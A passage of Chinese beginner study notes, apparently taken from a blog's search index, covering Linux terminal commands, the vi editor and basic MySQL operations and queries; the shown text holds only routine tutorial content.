默认智慧显示当前用户通过终端启动的应用程序 ps 选项说明功能 PID ** 表示 **进程代号 user 表示 当前用户身份 选项 含义 a 显示终端上的所有进程，包括其他用户的进程 u 显示进程的详细状态 x 显示没有控制终端的进程 kill -9 进程代号 中的 -9 表示强行终止，而-9通常用在 单纯用kill无法结束的进程 就可以加一个 -9， 提示：使用kill命令时，最好只终止当前用户开启的进程，而不要终止root身份开启的进程，否则可能导致系统崩溃 要退出top可以直接输入q kill命令使用时，先用ps查询进程代号，再用kill结束想要结束的进程。 其他命令命令 查找文件 find 软连接 ln 打包和压缩 tar 软件安装 apt-get 01.查找文件 find命令功能非常强大，通常用来在 特定的目录下 搜索 符合条件的文件 命令 作用 find[路径] -name “*搜索条件” 查找指定路径下的文件，包括子目录 如果省略路径，表示在当前文件夹下查找 之前的通配符，在使用find命令时也可以使用 演练目标 1.搜索桌面目录下，文件名包含 1 的文件 1find [桌面&#x2F;] -name “*1*” 搜索桌面目录下，所有以 .txt 为扩展名的文件 1find [桌面&#x2F;] -name &quot;*.txt&quot; 3.搜索桌面目录下，以数字1开头的文件 1find [桌面&#x2F;] -name &quot;1*&quot; 如果省略路径，是搜索当前路径下的全部文件和目录 02.软连接 命令 作用 ln -s 被链接的源文件链接文件 建立文件的软链接，用通俗的方式讲类似于Windows下的 快捷方式 注意： 1.没有 -s 选项建立的是一个 硬链接文件 -s选项是不能省略的 两个文件占用相同大小的硬盘空间，工作中几乎不会建立文件的硬链接 2源文件要使用绝对路径，不能使用相对路径，这样可以方便移动链接文件后，仍然能够正常使用 硬链接（知道） 在使用ln 创建链接时，如果没有-s 选项 ，会创建一个硬链接，而不是软连接 03.打包压缩 打包压缩 是日常工作中备份文件的一种方式 在不同操作系统中，常用的打包压缩方式是不同的 在Windows 常用 rar mac 常用 zip Linux 常用 tar.gz 3.1打包/压缩 tar 是linux中最常用的备份 工具，此命令可以 把一系列文件 打包到 一个大文件中，也可以把一个 打包的大文件恢复成一系列文件 tar命令格式 如下： 12345# 打包文件tar -cvf 打包文件.tar 被打包文件&#x2F;路径...#解包文件tar -xvf 打包文件.tar tar 选项说明 选项 含义 c 生成档案文件，创建打包文件 x 揭开档案文件 v 列出归档解档的详细过程，显示进度 f 指定档案文件名称，f后面一定是.tar文件,所以必须放选项最后 注意：f选项必须放在最后，其他选项顺序随意。 tar 只负责打包不负责压缩 3.2压缩/解压缩1）gzip tar与gzip命令结合可以是实现文件 打包和压缩 tar 只负责打包文件，但不压缩 用gzip压缩tar打包后的文件，其扩展名一般用xxx.tar.gz 在linux中，最常见的压缩文件格式就是xxx.tar.gz 在tar 命令中有一个选项 -z 可以调用gzip ，从而可以方便的实现压缩和解压缩的功能 命令格式如下： 12345678# 压缩文件tar -zcvf 打包文件.tar.gz 被压缩的文件&#x2F;路径...# 解压缩文件tar -zxvf 打包文件.tar.gz# 解压缩到指定路径tar -zxvf 打包文件.tar.gz -C 目标路径 选项 含义 -C 解压缩到指定目录，注意：要解压缩的目录必须存在 如果不存在解压缩无法完成。 2）bzip2（two） tar与bzip2 命令结合可以使用实现文件打包和压缩（用法和gzip一样） tar 只负责打包文件，但不压缩 用bzip2 压缩 tar 打包后的文件，其扩展名一般用xxx.tar.bz2 在 tar 命令中有一个选项 -j 可以调用 bzip2，从未可以方便的实现压缩和及压缩的功能 命令格式如下： 12345# 压缩文件tar -jcvf 打包文件.tar.bz2 被压缩的文件&#x2F;路径..#解压缩文件tar -jxvf 打包文件.tar.bz2 想要用gzip 时候 加 -z 想要用bzip2 加 -j 04.软件安装4.1.通过apt 安装/卸载软件 apt 是Advanced Packaging Tool,是Linux下的一款安装包管理工具 可以在终端中方便的 安装/卸载/更新软件包 12345678# 1.安装软件$ sudo apt install 软件包# 2.卸载软件$ sudo apt remove 软件名# 3.更新已安装的包$ sudo apt upgrade 要使用 apt 必须要用 sudo 用 root 身份执行 安装演练 12# 一个小火车提示$ sudo apt install sl 12# 一个比较漂亮的查看当前进程排名的软件$ sudo apt install htop 4.2配置软件源 如果希望Ubuntu 中安装软件，更加快速，可以通过设置镜像源，选择一个访问网速更快的服务器来提供软件下载/安装服务 提示：更换服务器之后，需要一个相对不较长时间的更新过程，需要耐心等待。更新完成后，在安装软件都会从新设置的服务器下载软件了 软件源概念： Ubuntu提供有一个主服务器，主服务器有所有软件的安装包，我们就会吧这个主服务器叫做软件源，所谓软件源，就是提供所有软件安装包的源头。 镜像源概念： 所谓镜像源，就是所有服务器的内容是相同的（镜像），但是根据所在位置不同，国内服务器通常速度会更快一些！ vi——终端中的编辑器目标 vi简介 打开和新建文件 三种工作模式 常用命令 分屏命令 常用命令速查图 01.vi简介1.1学习 vi 的目的 在工作中，要对 服务器 上的文件进行 简单 的修改，可以使用ssh远程登录到服务器上，并且使用vi进行快速的编辑即可 常见需要修改的文件包括： 源程序 配置文件，例如ssh的配置文件~/.ssh/config 在没有图形界面的环境下，要编辑文件，vi是最佳选择 每一个要使用Linux的程序员，都应该或多或少学习一些vi的常用命令 1.2vi 和 vim vi的特点 没有图形界面 的 功能强大 的编辑器 只能是编辑 文本内容， 不能对字体、段落进行排版 不只吃鼠标操作 没有菜单 只有命令 vi 编辑器在 系统管理、服务器管理 编辑文件时，其功能永远不是图形界面的编辑器能比拟的 02.打开和新建文件 在终端中输入vi 在后面跟上文件名 即可 1# vi 文件名 如果文件已经存在，会直接打开文件 如果文件不存在，会新建一个文件 2.1 打开文件并且定位行用 vi 打开已有内容的文件后，按 i 进行编辑模式 在日常工作中，有可能会遇到 打开一个文件，并定位到指定行 的情况 例如：在开发时，知道某一行代码有错，可以 快速定位 到出错代码的位置 这个时候，可以使用以下命令打开 12# vi 文件名 +行数如果只带上+而不指定行数，或直接定位在末尾 2.2异常处理 如果vi异常退出，再吃攀上可能会保存有交换问及那 下次在使用vi编辑该文件是，会看到一下屏幕信息，按下字母d可以删除交换文件即可 提示：按下键盘是之一关闭输入法 末行模式命令 命令 功能 w 保存 q 退出，如果没有保存，不允许退出 q！ 强行退出，不保存退出 wq 保存并退出 x 保存并退出 04.vi 常用命令4.1移动（基本）1）上、下、左、右 命令 功能 h 向左 j 向下 k 向上 l 向右 2）行内移动 命令 功能 w 向后移动一个单词 b 向前移动一个单词 0 行首 ^ 行首，第一个不是空白符的位置 $ 行尾 3）行数移动 命令 功能 gg 文件顶部 G 文件末尾 数字gg 移动到 数字 对应行数 数字G 移动到 数字 对应行数 ：数字 移动到数字对应行数 4）屏幕移动 命令 功能 Ctrl+b 向上翻页 Ctrl+f 向下翻页 H 屏幕顶部 M 屏幕中间 L 屏幕底部 4.2移动（程序）1）段落移动 在vi中使用 空行 来区分段落 在程序开发是，通常 一段功能相关的代码会写在一起 —— 之间没有空行 命令 功能 { 上一段 } 下一段 2）括号切换 在程序世界中，{}、[]、() 使用频率很高，而且 都是成对出现的 命令 功能 % 括号匹配及切换 3）标记 在开发时，某一块代码可能 需要稍后处理，例如：编辑、查看 此时先使用 m 增加一个标记，这样可以 在需要时快速的跳转回来 或者 执行其他编辑操作 标记名称 可以是 a~z 之间的任意 一个 字母 添加了标记的 行如果被删除，标记同时被删除 如果 在其他行添加了相同名称的标记，之前添加的标记也会被替换掉 命令 功能 mx 添加标记x，x是az 或者AZ之间的任意一个字母 ‘x 直接定位到标记x所在位置 选中文本（可视模式） 学习复制命令前，应该先学会 怎样选中 要复制的代码 在 vi 中 要选择文本，需要先使用 visual 命令切换到 可视模式 vi 中提供了 三种 可是模式，可以方便程序员选择 选中文本的方式 按ESC 可以放弃选中，返回 命令模式 命令 模式 功能 v 可视模式 从光标位置开始按照正常模式选择文本 V 可视行模式 选中光标经过的完整行 Ctrl + v 可是块模式 垂直方向选中文本 可视模式下 ，可以和 移动命令 连用， 例如：ggVG 能够选中所有内容 4.4撤销和恢复撤销 在学 编辑命令 之前，先要知道怎样撤销之前一次 错误的 编辑动作~ 命令 英文 功能 u undo 撤销上次命令 Ctrl+r redo 恢复撤销的命令 4.5删除文本 命令 英文 功能 x cut 删除光标所在字符，胡总和选中文字 d（移动命令） delete 删除移动命令对应的内容 dd delete 删除光标所在行，可以 ndd 复制多行 D delete 删除至行尾 提示：如果使用 可视模式 已经选中了一段文本，那么无论使用 d 还是 x，都可以删除选中文本 删除命令可以和 移动命令 连用，一下常见的组合命令： 12345* d0 # 从光标位置删除到一行的起始位置* d&#125; # 从光标位置删除到段落的结尾* ndd # 从光标位置向下连续删除 n 行* d代码行G # 从光标所在行 删除到 指定代码行 之间的所有代码* d&#39;a # 从光标所在行 产出到 标记a 之间的所有代码 4.6 复制、粘贴 vi 中提供有一个 被复制文本的缓冲区 复制 命令会将选中的文字保存在缓冲区 删除 命令删除的文字会被保存在缓冲区 再所需的位置，使用 粘贴 命令可以将缓冲区的文字插入到光标所在位置 命令 英文 功能 y（移动命令） copy 复制 yy copy 复制一行，可以nyy复制多行 p paste 粘贴 注意 命令 d、x 本质是剪切命令，但被放入文本缓冲区，如果有其他复制或者剪贴命令，之前的剪切内容将被替换。 也就是说 vi 中没有删除命令，只有剪贴命令，而剪切命令也被认为是删除命令 vi中的 文本缓冲区 和 系统的剪贴板 不是同一个 所以在其他软件中使用 Ctrl+C 复制的内容跟，不能再 vi 中通过 P 命令粘贴 可以在 编辑模式 下使用 鼠标右键粘贴 4.7 替换 命令 英文 功能 工作模式 r replace 替换当前字符 命令模式 R replace 替换当前光标所在位置向后替换 替换模式 R 命令可以进入 替换模式 ， 替换完成后，按下ESC 可以回到 命令模式 替换命令 的作用就是不用进入 编辑模式，对文件进行 轻量级的修改 对文件修改幅度非常小可以用替换命令，否则就要使用 编辑模式 再用ESC退出，效率太慢 4.8 缩排和重复执行 命令 功能 &gt;&gt; 向右增加缩进 &lt;&lt; 想做减少缩进 . 重复上次命令 缩排命令 在开发程序时，通一增加代码的缩进 比较有用！ 一次性 在选中代码前增加4个空格，就叫做 增加缩进 一次性 在选中代码前删除4个空格，就叫做减少缩进 在 可视模式 下，缩排命令需要使用一个 &gt; 或这 &lt; 在程序中，缩进 通常用来表示代码的归属关系 缩进对于程序开发非常重要 前面空格越少，代码的级别越高 前面空格越多，代码的级别越低 4.9 查找常规查找 命令 功能 /str（内容） 查找 str 查找到指定内容之后，使用 Next 查找下一个出现的位置： n：查找下一个出现的位置 N：查找上一个出现的位置 如果不想看到的高亮显示，可以随便查找一个文件中不存在的内容即可 单词快速匹配 命令 功能 ***** 向后查找当前目标虽在单词 # 向前查找当前光标所在单词 在开发中，通过单词快速匹配，可以快速看到这个单词在其他什么位置使用过 4.10 查找并替换 在vi中查找和替换命令需要在 末行模式下 执行 格式： 1# ：%s&#x2F;&#x2F;&#x2F;g 1)全局替换 一次性替换文件中的 所有出现的旧文本 格式： 1# ：%s&#x2F;旧内容&#x2F;新内容&#x2F;g 2）可视区域替换 先选中 要替换文字的 范围 格式： 1# :s&#x2F;旧文本&#x2F;新文本&#x2F;g 3）确认替换 如果把末尾的g 改成gc 再替换的时候会有提示 是否替换 1# ：%s&#x2F;旧文本&#x2F;新文本&#x2F;gc y - yes 替换 n - no 不替换 a - all 替换所有 q - quit 退出替换 l - last 最后一个，并把光标移动到行首 ^E 向下滚屏 ^Y 向上滚屏 4.11 插入命令 编辑模式 命令 功能 常用 i 在当前字符前插入文本 常用 I 在行首插入文本 较常用 a 在当前字符后添加文本 A 在行末添加文本 较常用 o 在当前行后插入一空行 常用 O 在当前行前面插入一空行 常用 重复命令： 随便输入一个 数字， 输入 i 进入编辑模式 输入 你想要输入的内容 按ESC 返回 命令模式，返回之后会把你要输入的内容重复。 利用 可视块 给多行代码增加注释在 Python 中 ，要给代码增加注释，可以在代码前增加一个 # 要实现这个效果可以在 命令模式 下 移动到要添加注释的 第一行代码 ， 按^来到行首 按Ctrl+v 进入 可视块 模式 使用 j 向下连续选中要添加的代码行 输入 I 进入 编辑模式，并在 行首插入，注意：一定要使用I 输入 # 也就是注释号 按下 ESC 返回到 命令模式，返回之后 vi 会在之前选中的每一行代码前插入 # 0.5分屏命令5.1末行命令扩展 命令 英文 功能 :e . edit 会打开内置的文件浏览器，浏览要当前目录下的文件 :n 文件名 new 新建文件 :w 文件名 write 另存为，但是仍然编辑当前文件，并不会切换文件 *:w 命令 如果要阶段性备份的话就可以使用 : w 命令 * 切换文件之前，必须保证当前这个文件已经被保存！ 学习过的 末行命令： 命令 英文 功能 :w write 保存 :q quit 退出，如果没有保存不允许退出 :q! quit 强行退出，不保存退出 :wq write&amp;quit 保存并退出 :x 保存并退出 :%s///gc 确认搜索并替换 5.2 分屏命令 使用 分屏命令，可以 同时编辑和查看多个文件 命令 英文 功能 :sp[文件名] splip 横向增加分屏 :vsp[文件名] vertical split 纵向增加分屏 1）切换分屏窗口 分屏窗口都是基于Ctrl+W这个快捷键的，W对应的英文单词是window 命令 英文 功能 W window 切换到下一个窗口 r reverse 互换窗口 c close 关闭当前窗口，但是不能关闭最后一个窗口 q quit 退出当前窗口，如果是最后一个窗口，则关闭vi o other 关闭其他窗口","categories":[],"tags":[]},{"title":"MySQL数据库","slug":"MySQL数据库","date":"2020-04-03T06:25:27.095Z","updated":"2020-04-03T06:32:58.000Z","comments":true,"path":"2020/04/03/MySQL数据库/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/03/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"","text":"MySQL数据库优点 持久化数据到本地 可以实现结构化查询，方便管理 成本低：开源，免费使用 性能高：移植性好 体积小便于安装 数据的概念 DB 数据库(database)：存储数据的“仓库”。它保存了一系列有组织的数据。 DBMS 数据管理系统(Database Management System)。数据库是通过DBMS创建和操作的容器，又被称为数据 数据库管理系统-DBMS用于 检索数据、插入数据、更新数据、删除数据 SQL 结构化查询语言(Structure Query Language)：专门用来与数据库通信的语言 SQL的优点：1、不是某个特定数据库供应商应有的语言，几乎所有DBMS都支持SQL2、简单易学3、虽然简单，但实际上是一种强有力的语言，灵活使用其他语言元素，可以进行非常复杂和高级的数据库操作数据库存储数据的特点1、将数据放到表中，表再放到库中2、一个数据库中可与有多个表，每个表都有一个名字，用来标识自己的。表明具有唯一性。3、表具有一些特性，这些特性定义了数据再表中如何存储，类似java中”类”的设计。4、 表由列组成，我们也成为字段。所有表都是由一个或多个列组成的，每一列类似java中的”属性”5、表中的数据是按行存储的，每一行类似于java中的”对象”。常见数据库管理系统MySQL、Oracle、db2、SQL server 登录和退出MySQL1234567登录指令mysql -h localhost -P 3306 -u root -p登录指令简写mysql -u root -p退出指令exit 或者 ctrl+c MySQL的常见命令其中，mysql、information_schema、performance_schema这三个库是不能随便动的 mysql（用于保存用户信息的） information_schema（用于保存原数据信息） performance_schema（用于搜集性能信息，性能参数） test（表示测试数据库，这个库里面是空的，没有表，可以在里面去新建表，可以修改库删除库） 每条命令结尾都要加分号;（非常重要）插入sql文件，也就是插入数据库1mysql&gt; source sql文件位置 查看当前所有数据库1show databases; 进入库的指令是use 库名；123#use 后面加上指定库名，这里进入的就是test库，结尾不要忘记加分号;mysql&gt; use test;Database changed #返回一个database changed表示打开了test库 查看库中的表show tables；123#查看当前库中的表用 show tablesmysql&gt; show tables;Empty set (0.00 sec) #返回结果empty set 表示空的 查看其他库的所有表show tables from 库名；12#这样也可以查看其他库的表mysql&gt; show tables from mysql; 声明：如果用use进入当前库之后，再用show tables from来查看其他库的内容，虽然显示了其他库的表，但是位置还是在use进入的库里12345678910#这里use先进入的test库，虽然用show tables from查看了其他库的表，但是位置还是再test里面例如:mysql&gt; use test;Database changedmysql&gt; show tables;Empty set (0.00 sec)mysql&gt; show tables from mysql; 库里面表的内容 查看所在的库select database();1234567mysql&gt; select database();+------------+| database() |+------------+| test |+------------+1 row in set (0.00 sec) 新建数据库1mysql&gt; create database 库名; 删除数据库1mysql&gt; drop database 库名; 新建表create table 表名;12345格式：creact table 表名( 列名 列类型, 列名 列类型 ...); 12345678910111213#用create table 创建一个handsome的表，表是由列组成的，加一个id列，这个列的类型是int类型，还有一个name列，它的类型是字符串，varchar，20表示可以存储最多20个字符，也就是字符串的最大长度，varchar是可变字符串的意思mysql&gt; create table handsome( -&gt; id int, -&gt; name varchar(20));Query OK, 0 rows affected (0.02 sec)#用show tables;查看当前库中的表mysql&gt; show tables;+----------------+| Tables_in_test |+----------------+| handsome |+----------------+1 row in set (0.00 sec) 删除表1mysql&gt; drop table 表名; 查看表的结构desc 表名;123456789#用desc产看了handsome表的结构mysql&gt; desc handsome;+-------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || name | varchar(20) | YES | | NULL | |+-------+-------------+------+-----+---------+-------+2 rows in set (0.01 sec) 查看当前表的数据select * from 表名;123# 当前handsome表里并没有数据 mysql&gt; select * from handsome;Empty set (0.00 sec) 向表中插入数据insert into 表名() values (插入内容);123456789101112131415#mysql&gt; insert into handsome (id,name) values(1,&#39;john&#39;);Query OK, 1 row affected (0.00 sec)mysql&gt; insert into handsome (id,name) values(2,&#39;rose&#39;);Query OK, 1 row affected (0.00 sec)# 用 select * from handsome;查看当前表的内容mysql&gt; select * from handsome;+------+------+| id | name |+------+------+| 1 | john || 2 | rose |+------+------+ 修改表中内容update 表名 set 字段=’更改内容’ where 列名=序号;12345678910111213mysql&gt; update handsome set name&#x3D;&#39;MySQL&#39; where id&#x3D;1;Query OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0# 用select *form handsome;查看handsome表中的内容mysql&gt; select * from handsome;+------+-------+| id | name |+------+-------+| 1 | MySQL || 2 | rose |+------+-------+2 rows in set (0.00 sec) 删除表中内容delete from 表名 where 列名=序列号;1234567891011#删除handsome表中的id列中的1序列号内容，mysql&gt; delete from handsome where id&#x3D;1;Query OK, 1 row affected (0.00 sec)mysql&gt; select * from handsome;+------+------+| id | name |+------+------+| 2 | rose |+------+------+1 row in set (0.00 sec) 查看MySQL当前版本1、select version();123456789#第一种方法，用select version();查看当前版本，version是版本的意思，说明当前版本是5.5#第一种方法实在MySQL客户端上查看mysql&gt; select version();+-----------+| version() |+-----------+| 5.5.53 |+-----------+1 row in set (0.00 sec) 2、mysql -version 简写形式：mysql -V123456#退出mysql后，再当前命令行用mysql --version查看版本，版本还是5.5D:\\phpStudy\\PHPTutorial\\MySQL\\bin&gt;mysql --versionmysql Ver 14.14 Distrib 5.5.53, for Win32 (AMD64)D:\\phpStudy\\PHPTutorial\\MySQL\\bin&gt;mysql -Vmysql Ver 14.14 Distrib 5.5.53, for Win32 (AMD64) MySQL的语法规范12345671、不区分大小写，建议关键字大写，表名、列名小写2、每条命令最好用分号结尾3、每条命令根据需要，可以进行缩进 或 换行(命令过长时，可以使用换行，如果换行，建议关键字单独一行)4、注释 单行注释:#注释文字 单行注释:-- 注释文字(注意，--后有空格) 多行注释:&#x2F;* 注释文字 *&#x2F; myemployees库四张表介绍employees表 | 员工表 列名 含义 employee_id int(6) 员工编号 first_name，varchar(20) 名 last_name， varchar(25) 姓（姓名） email，varchar(25) 邮箱 phone_number， varchar(20) 电话号码 job_id， varchar(10) 工种编号 salary， double(10,2) 月薪 commission_pct， double(4,2) 奖金率 manager_id， int(6) 上级领导的员工编号 department_id， int(4) 部门编号 hiredate， datetime 入职时间 departments表 | 部门表 列名 含义 department_id 部门编号 department_name 部门名称 manager_id 部门领导的员工编号 location_id 位置编号 locations表 | 位置表 列名 含义 location_id 位置编号 street_address 街道地址 postal_code 邮编地址 city 城市 state_province 省 country_id 国家编号 jobs表 | 职位 列名 含义 job_id 职位编号 job_title 职位名称 min_salary 最低工资 max_salary 最高工资 DQL语言基础查询（重点）语法：​ select 查询列表 from 表名; 特点：1、查询列表可以是：表中的字段，常量值、表达式、函数2、查询的结果是一个虚拟的表格1着重号&#96; &#96;位置在数字一旁边,用于区分 &#39;关键字&#39;和&#39;字段&#39;的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691、查询表中的单个字段#last_name是employees表中的字段，如果不加FROM employees会出错mysql&gt; SELECT last_name FROM employees;2、查询表中的多个字段#查询多个字段每个字段中间用&#39;,&#39;逗号隔开mysql&gt; SELECT last_name,salary,email FROM employees;3、查询表中所有字段#查询employees所有字段mysql&gt; SELECT * FROM employees;还有一种方法，像第二步一样，将所有字段都打上，然后查询。4、查询常量值#100只是一个普通的常量值，并不是来自某个表所以不需要加FROMmysql&gt; SELECT 100; #还会返回结果，只不过它显示的字段名就是它本身+-----+| 100 |+-----+| 100 |+-----+查询字符型常量值# MySQL中是不区分字符和字符串的，只要是字符都认为是字符型mysql&gt; SELECT &#39;jock&#39;;+------+| jock |+------+| jock |+------+注意:字符型和日期型的常量值必须用引号引起来，数值型不需要5、查询表达式# 用SELECT 计算表达式也是可以的(+、-、*、&#x2F;、%...)算数运算符都可以用mysql&gt; SELECT 100*98;+--------+| 100*98 |+--------+| 9800 |+--------+6、查询函数# 函数最关键的标志就是&#39;()&#39;小括号，之前的VERSION()就是一个函数# 查看版本号mysql&gt; SELECT VERSION();+-----------+| VERSION() |+-----------+| 5.5.53 |+-----------+7、为字段起别名优点： 便于理解，提高可读性 如果要查询的字段有重名情况，使用别名可以区分。方式一：使用AS#格式 SELECT 内容(列表) AS 名称(别名)mysql&gt; SELECT 100%98 AS 结果;+------+| 结果 |+------+| 2 |+------+1 row in set (0.00 sec)# 将employees数据库中的last_name 和 first_name 分别起名 &#39;姓&#39;和&#39;名&#39;mysql&gt; SELECT last_name AS 姓,first_name AS 名 FROM employees;+-------------+-------------+| 姓 | 名 |+-------------+-------------+| K_ing | Steven |方式二：使用空格，不需要使用ASmysql&gt; SELECT last_name 姓,first_name 名 FROM employees;+-------------+-------------+| 姓 | 名 |+-------------+-------------+| K_ing | Steven |特殊情况 案例：给last_name起一个别名out put #如果这样运行会报错，因为中间有特殊符号 &#39;空格&#39;，MySQL不理解当前内容 mysql&gt; SELECT last_name AS out put from employees; 修改： #将有特殊符号的别名用(&quot;&quot;)双引号引起来，当然，这里着重号(&#39;&#39;)也是可以的。 mysql&gt; SELECT last_name AS &quot;out put&quot; from employees; 8、去重 distinct语法： SELECT DISTINCT 字段名 FROM 表名;案例：查询员工表中涉及到的所有部门编号# 其中有很多重复的编号mysql&gt; SELECT department_id FROM employees;+---------------+| department_id |+---------------+| NULL || 10 || 20 || 20 || 30 || 30 |# 这样就将重复的数字去除了mysql&gt; select distinct department_id from employees;+---------------+| department_id |+---------------+| NULL || 10 || 20 || 30 || 40 |注意:去重不能用于多个字段，只能用于单字段9、+号的作用在其他编程语言中+号是运算符，也是拼接符，而在MySQL中+号： 只有一个功能:运算符select 100+90; 两个操作数都是数值时，则做加法运算select &#39;123&#39;+90; 只要其中一方为字符型，试图将字符型转换成数值型 如果转换成功，则继续做加法运算select &#39;john&#39;+90; 如果转换失败，则将字符型数值转换成0select null+90; 只要其中一方为null，则结果肯定为null案例：查询员工名和姓连接成一个字段，并显示为 姓名#虽然没报错，但是输出结果全是0，原因是+号和我们想象的不一样，这里并不是拼接的意思 mysql&gt; SELECT last_name+first_name AS 姓名 FROM employees;+------+| 姓名 |+------+| 0 | 【补充】concat函数在MySQL中做拼接就不能用+号了而是用到一个函数CONCAT函数mysql&gt; SELECT CONCAT(last_name,first_name) AS 姓名 FROM employees;+------------------+| 姓名 |+------------------+| K_ingSteven |【补充】ifnull函数IFNULL()函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回指定的值，如果不为 NULL 则返回原来的的值# 用IFNULL判断时候为null，结果为null返回0，不为null返回本身mysql&gt; SELECT CONCAT(first_name,&#39;,&#39;,last_name,&#39;,&#39;,IFNULL(commission_pct,0)) AS out_put FROM employees;+------------------------+| out_put |+------------------------+| Steven,K_ing,0.00 || Neena,Kochhar,0.00 || John,Russell,0.40 |【补充】isnull函数判断某字段表达式是否为null，如果是，则返回1，否则返回0SELECT CONCAT(first_name,&#39;,&#39;,last_name,&#39;,&#39;,ISNULL(commission_pct,0)) AS out_put FROM employees; 条件查询12345678&lt;&gt;和!&#x3D;都是不等于的意思语法： SELECT 查询列表 FROM 表名 WHERE 筛选条件; #这里的where可以理解为if的意思 分类: 一、按条件表达式筛选(条件运算符):&gt;、&lt;、&#x3D;、&lt;&gt;(!&#x3D;)、&gt;&#x3D;、&lt;&#x3D; #其中&lt;&gt;表示不等于，也可以用!&#x3D; 二、按逻辑表达式筛选(逻辑运算符):and、or、not 三、模糊查询:like、between and、in、is null 1、按条件表达式筛选1234案例一:查询工资&gt;12000的员工信息mysql&gt; SELECT * FROM employees WHERE salary&gt;12000; 案例二:查询部门编号不等于90号的员工名和部门编号mysql&gt; SELECT last_name,department_id FROM employees WHERE department_id&lt;&gt;90; 2、按逻辑表达式筛选1234567891011121314151617案例一:查询工资在1w到2w之间的员工名、工资、以及奖金mysql&gt; SELECT -&gt; last_name,salary,commission_pct -&gt; FROM -&gt; employees -&gt; WHERE -&gt; salary&gt;&#x3D;10000 AND salary&lt;&#x3D;20000; 案例一:查询部门编号不是在90到110之间，或者工资高于15000的员工信息 SELECT -&gt; department_id,salary -&gt; FROM -&gt; employees -&gt; WHERE -&gt; department_id&lt;90 AND department_id&gt;110 OR salary&lt;15000; #还有一种是 -&gt; NOT(department_id&gt;&#x3D;90 AND department_id&lt;&#x3D;110) OR salary&lt;15000; 模糊查询一、like特点: 一般和通配符搭配使用 通配符: % 任意多个字符，包含0个字符 _ 任意单个字符 123456789101112131415161718192021222324252627282930 案例一:查询员工名中包含字符a的员工信息#a是字符用引号引起，%代表通配符mysql&gt; SELECT * FROM employees WHERE last_name like &#39;%a%&#39;;案例二:查询员工名中第三个字符为n，第五个字符为l的员工名和工资mysql&gt; SELECT salary,last_name FROM employees WHERE last_name LIKE &#39;__n_l%&#39;;+---------+-----------+| salary | last_name |+---------+-----------+| 9000.00 | Hunold |+---------+-----------+1 row in set (0.00 sec)案例三:查询员工名中第二个字符为下划线的 #可以用反斜杠转义mysql&gt; SELECT last_name FROM employees WHERE last_name LIKE &#39;_\\_%&#39;;+-----------+| last_name |+-----------+| K_ing || K_ing |+-----------+escape方法#可以不用反斜杠使用任意字符，然后再后面加一个 ESCAPE关键字，将之前的字符引起来就可以mysql&gt; SELECT last_name FROM employees WHERE last_name LIKE &#39;_^_%&#39; ESCAPE &#39;^&#39;; 二、between and1、使用between and 可以提高语句的简洁度 2、包含临界值 3、两个临界值不能调换顺序 12345678案例1:查询员工编号100到120之间的员工信息#这样就不需要像之前用and一样，每个数值前都需要加上字段名现在:mysql&gt; SELECT employee_id FROM employees WHERE employee_id BETWEEN 100 AND 120;#之前:mysql&gt; SELECT employee_id FROM employees WHERE employee_id&gt;&#x3D;100 AND employee_id&lt;&#x3D;120;not between andmysql&gt; SELECT last_name,salary FROM employees WHERE salary NOT BETWEEN 8000 and 17000 三、in含义:判断某一字段的值是否属于in列表中的某一项，只要满足其中一项就可以，类似于or特点:1、使用in提高了语句的简洁度2、in列表的值类型必须统一或者兼容3、in列表不支持通配符1234案例:查询员工的工种编号是 IT_PROG、AD_VP中的一个员工名和工种编号现在:mysql&gt; SELECT last_name,job_id FROM employees WHERE job_id IN (&#39;IT_PROG&#39;,&#39;AD_VP&#39;);之前:mysql&gt; SELECT last_name,job_id FROM employees WHERE job_id&#x3D;&#39;IT_PROG&#39; OR job_id&#x3D;&#39;AD_VP&#39;; 四、is null= 或者 &lt;&gt; 不能用于判断null值is null 或 is not null 可以判断null值1234案例一:查询没有奖金的员工名和奖金率mysql&gt; SELECT last_name,commission_pct FROM employees WHERE commission_pct IS NULL;查询有奖金的:mysql&gt; SELECT last_name,commission_pct FROM employees WHERE commission_pct IS NOT NULL; 安全等于 &lt;=&gt;是判断是否等于， 12345案例一:查询没有奖金的员工名和奖金率mysql&gt; SELECT last_name,commission_pct FROM employees WHERE commission_pct &lt;&#x3D;&gt; NULL;案例二:查询工资12000的员工信息mysql&gt; SELECT last_name,salary FROM employees WHERE salary &lt;&#x3D;&gt; 12000; 排序查询123456789101112131415161718192021222324252627282930提点: 1、ASC是升序 DESC是降序，如果不写，默认是升序 2、order by子句中可以支持单个字段、多个字段、表达式、函数、别名 3、order by子句一般是放在查询语句的最后面，limit语句除外 语法一: SELECT 查询列表 FROM 表 【WHERE 筛选条件】 ORDER BY 排序列表 |【ASC | DESC】案例:查询员工信息，要求工资从高到低排序 | 从低到高只需要把DESC修改成ASC就可以mysql&gt; SELECT * FROM employees WHERE salary ORDER BY salary DESC;案例二:查询部门编号&gt;&#x3D;90的员工信息,按入职时间的先后进行排序【添加筛选条件】mysql&gt; SELECT department_id,hiredate FROM employees WHERE department_id&gt;&#x3D;90 ORDER BY hiredate ASC;案例三:按年薪的高低显示员工的信息和年薪【按表达式排序】mysql&gt; SELECT *,salary*12*(1+IFNULL(commission_pct,0)) 年薪 -&gt; FROM employees -&gt; ORDER BY salary*12*(1+IFNULL(commission_pct,0)) DESC; 案例四:按年薪的高低显示员工的信息和年薪【按别名排序】mysql&gt; SELECT *,salary*12*(1+IFNULL(commission_pct,0)) 年薪 -&gt; FROM employees -&gt; ORDER BY 年薪 DESC; 案例五:按姓名的长度显示员工的姓名和工资【按函数排序】lenth()函数可以显示字符长度mysql&gt; SELECT LENGTH(last_name) 字节长度,last_name,salary FROM employees ORDER BY LENGTH(last_name);案例六:查询员工信息，要求先按照员工工资排序，再按员工编号排序【按多个字段排序】mysql&gt; SELECT * FROM employees ORDER BY salary ASC,employee_id DESC; 常见函数概念:将一组逻辑语句封装在方法体中，对外暴露方法名好处:1、隐藏了函数实现细节 